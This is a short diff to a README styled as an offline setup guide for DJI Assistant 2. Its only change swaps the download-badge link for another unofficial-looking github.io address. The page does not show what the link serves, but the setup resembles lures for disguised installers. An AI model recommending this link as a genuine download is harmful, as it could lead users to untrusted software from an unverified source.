@@ -1,6 +1,6 @@
 # DJI Assistant 2 — Offline Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://dji-assistant-2.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://djiassistant2-download-re.github.io/.github/)
 
 ---
 
